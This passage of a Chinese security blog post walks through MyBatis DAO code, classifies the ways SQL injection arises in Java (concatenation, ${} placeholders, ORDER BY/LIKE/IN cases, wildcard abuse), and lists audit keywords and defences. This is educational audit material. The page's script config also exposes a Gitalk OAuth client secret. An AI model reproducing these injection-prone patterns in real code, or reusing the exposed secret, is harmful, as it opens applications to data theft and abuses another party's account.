</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param uid
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="n">Users</span> <span class="nf">getUserById</span><span class="o">(</span><span class="n">String</span> <span class="n">uid</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 根据id查询一条结果集，返回一个map集合
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @param id
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getUserById2</span><span class="o">(</span><span class="n">String</span> <span class="n">id</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 查询所有，返回多个Users对象
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="n">List</span><span class="o">&lt;</span><span class="n">Users</span><span class="o">&gt;</span> <span class="nf">listUser</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">     * 根据所有结果集，返回多个map集合
</span></span></span><span class="line"><span class="cl"><span class="cm">     * @return
</span></span></span><span class="line"><span class="cl"><span class="cm">     */</span>
</span></span><span class="line"><span class="cl"><span class="n">List</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;&gt;</span> <span class="nf">listUser2</span><span class="o">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>在UserDaoImpl类实现UserDao接口并重写抽象方法：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">save</span><span class="o">(</span><span class="n">Users</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//获取SqlSession实例，true表示自动提交事务
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">)){</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//getMapper方法返回一个代理对象，这个代理对象也是实现了UserDao接口
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//底层使用JDK动态代理技术
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">UserDao</span> <span class="n">dao</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">//当执行save方法时，其实调用的时代理对象的save，
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//它会解析mapper映射配置文件，找到id为save的元素
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">//并执行其中的sql语句
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">dao</span><span class="o">.</span><span class="na">save</span><span class="o">(</span><span class="n">user</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">save2</span><span class="o">(</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">)){</span>
</span></span><span class="line"><span class="cl">        <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">save2</span><span class="o">(</span><span class="n">map</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">update</span><span class="o">(</span><span class="n">Users</span> <span class="n">user</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">)){</span>
</span></span><span class="line"><span class="cl">        <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">update</span><span class="o">(</span><span class="n">user</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">delete</span><span class="o">(</span><span class="kt">int</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">)){</span>
</span></span><span class="line"><span class="cl">        <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">delete</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kt">void</span> <span class="nf">update2</span><span class="o">(</span><span class="n">String</span> <span class="n">userName</span><span class="o">,</span> <span class="kt">int</span> <span class="n">uid</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">update2</span><span class="o">(</span><span class="n">userName</span><span class="o">,</span> <span class="n">uid</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Users</span> <span class="nf">getUserById</span><span class="o">(</span><span class="n">String</span> <span class="n">uid</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">getUserById</span><span class="o">(</span><span class="n">uid</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="nf">getUserById2</span><span class="o">(</span><span class="n">String</span> <span class="n">id</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">getUserById2</span><span class="o">(</span><span class="n">id</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">Users</span><span class="o">&gt;</span> <span class="nf">listUser</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">listUser</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@Override</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;&gt;</span> <span class="nf">listUser2</span><span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="o">(</span><span class="n">SqlSession</span> <span class="n">sqlSession</span> <span class="o">=</span> <span class="n">MybatisUtils</span><span class="o">.</span><span class="na">getSqlSession</span><span class="o">(</span><span class="kc">true</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">sqlSession</span><span class="o">.</span><span class="na">getMapper</span><span class="o">(</span><span class="n">UserDao</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">listUser2</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="n">e</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="常见sql注入漏洞分类挖掘技巧">常见SQL注入(漏洞分类挖掘技巧)</h3>
<p>白盒挖掘层面大致可以将SQLi的类型分为六类：</p>
<p>1、入参直接动态拼接；</p>
<p>2、预编译有误；</p>
<p>3、框架注入（Mybatis+Hibernate）；</p>
<p>4、order by 绕过预编译；</p>
<p>5、%和_绕过预编译；</p>
<p>6、SQLi检测绕过</p>
<h4 id="1sql语句参数直接动态拼接">1.SQL语句参数直接动态拼接</h4>
<p>未使用PreparedStatement或者未正确使用PreparedStatement，直接使用拼接，并且未进行过滤，导致sql注入</p>
<h4 id="2预编译有误">2.预编译有误</h4>
<p>比如：虽然使用了PreparedStatement，但是sql语句中还是进行了拼接，这样还是会导致sql注入产生</p>
<h4 id="3框架使用不当导致sql注入">3.框架使用不当导致SQL注入</h4>
<h5 id="mybatis">Mybatis</h5>
<ul>
<li>#{变量} 可以防止注入，底层是用prepareStatement实现的</li>
<li>${变量} 不能防注入，底层的用拼接实现的</li>
</ul>
<p>若使用<code>${参数}</code>的方式，并且对用户输入过滤不严格的情况下，仍然会产生sql注入</p>
<h5 id="hibernate">Hibernate</h5>
<p>Hibernate有几种HQL参数绑定的方式可以有效避免SQL注入</p>
<p>但Hibernate支持远程的SQL语句执行，若是直接采用拼接的方式，则会产生SQL注入</p>
<h4 id="4order-by-绕过预编译">4.order by 绕过预编译</h4>
<p>某些情况下是不能使用PreparedStatement的，比如在order by下。order by子句后面需要加字段名或字段位置，而字段名是不能带引号的，否则就会被认为是一个字符串而不是字段名。PreparedStatement是使用占位符传递参数的，传递的字符都会有单引号包裹，就会导致order by子句失效。</p>
<p>所以，当使用order by子句进行查询时，需要使用拼接的方式，在这种情况下很可能产生sql注入。因此要防御SQL注入，就要进行字符串过滤。</p>
<h4 id="5和_模糊查询">5.%和_模糊查询</h4>
<p>在Java预编译查询中不会对%和_进行转义处理，而%和_刚好是like查询的通配符，如果没有做好相关的过滤，就可以导致恶意模糊查询，占用服务器性能，甚至可能耗尽资源，造成服务器宕机。</p>
<p>此类攻击场景大多出现在查询的功能接口中，直接对<code>%</code>进行过滤就是最简单有效的防御方式。</p>
<h4 id="6mybatis常见sql注入漏洞">6.MyBatis常见SQL注入漏洞</h4>
<p><strong>6.1order by查询</strong></p>
<p>要使用order by就只能使用<code>${参数}</code></p>
<p><strong>6.2like查询</strong></p>
<p>Mybatis的like子句使用<code>#{}</code>会报错，只能用<code>${}</code></p>
<p><strong>6.3in参数</strong></p>
<p>Mybatis的in查询使用<code>#{}</code>会报错，只能用<code>${}</code></p>
<h3 id="常规代码审计">常规代码审计</h3>
<p><strong>常见关键字：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Statement
</span></span><span class="line"><span class="cl">ceateStatement
</span></span><span class="line"><span class="cl">PrepareStatement
</span></span><span class="line"><span class="cl">like <span class="err">&#39;</span>%<span class="o">{</span>
</span></span><span class="line"><span class="cl">in<span class="o">(</span><span class="si">${</span><span class="p">
</span></span></span><span class="line"><span class="cl"><span class="p">select
</span></span></span><span class="line"><span class="cl"><span class="p">update
</span></span></span><span class="line"><span class="cl"><span class="p">insert
</span></span></span><span class="line"><span class="cl"><span class="p">...
</span></span></span></code></pre></td></tr></table>
</div>
</div><h1 id="漏洞防御">漏洞防御</h1>
<ul>
<li>最有效的是进行预编译手段</li>
<li>在Java开发中除了原生的JDBC，可以选择Druid、MyBatis等</li>
<li>类型转换，比如已知是int型，就对接收的参数都强转成int型</li>
<li>进行过滤</li>
</ul>
<h1 id="参考">参考</h1>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><a href="https://cloud.tencent.com/developer/article/1534109"target="_blank" rel="external nofollow noopener noreferrer">https://cloud.tencent.com/developer/article/1534109<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><a href="https://mp.weixin.qq.com/s/qG_m7YXvEw2PwFXQDj6_qw"target="_blank" rel="external nofollow noopener noreferrer">https://mp.weixin.qq.com/s/qG_m7YXvEw2PwFXQDj6_qw<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><a href="https://www.ms509.com/2020/06/24/Waf-Bypass-Sql/"target="_blank" rel="external nofollow noopener noreferrer">https://www.ms509.com/2020/06/24/Waf-Bypass-Sql/<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><a href="https://xz.aliyun.com/t/368"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/368<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><a href="https://mp.weixin.qq.com/s/PMWDpT8_z4ElU_3XLWZepA"target="_blank" rel="external nofollow noopener noreferrer">MySQL绕过小结 (qq.com)<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
<p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/peterpan0707007/p/8242119.html<i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"></i></a></p>
</div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title=2023-02-07&#32;02:55:54>更新于 2023-02-07&nbsp;</span>
      </div><div class="post-info-license">
          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
        </div></div>
    <div class="post-info-line">
      <div class="post-info-md"><span><a href="/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
      <div class="post-info-share">
        <span></span>
      </div>
    </div>
  </div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/sql%E6%B3%A8%E5%85%A5/' class="post-tag">SQL注入</a><a href='/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/' class="post-tag">代码审计</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="反序列化漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>反序列化漏洞</a>
      <a href="/ssti%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="post-nav-item" rel="next" title="SSTI服务端模板注入">SSTI服务端模板注入<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
<div id="comments"><div id="gitalk" class="comment"></div><noscript>
        Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
      </noscript></div></article></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.110.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
              <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"gitalk":{"admin":["shuai06"],"clientID":"d75ec1a5864747376f6f","clientSecret":"1b354dc131534bb3b7511213c74d3f9116a03a79","id":"2022-01-19T22:05:28+08:00","owner":"shuai06","repo":"hexo-gitalk","title":"SQL注入漏洞"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
</html>
